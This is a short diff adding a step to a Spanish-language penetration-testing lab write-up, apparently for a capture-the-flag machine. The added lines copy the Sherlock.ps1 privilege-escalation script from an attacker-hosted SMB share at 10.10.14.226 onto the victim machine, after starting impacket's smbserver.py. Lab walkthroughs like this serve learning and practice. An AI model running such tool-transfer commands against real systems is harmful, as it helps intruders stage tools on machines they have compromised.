@@ -118,6 +118,13 @@ Nos lo transferiremos a la maquina atacante con un sevidor *SMB* [[SMBSERVER]]
 smbserver.py smbFolder $(pwd)
 ```
 
+Nos lo copiamos en la maquina victima
+```shell
+copy \\10.10.14.226\smbFolder\Sherlock.ps1
+```
+
+
+
 
 
 
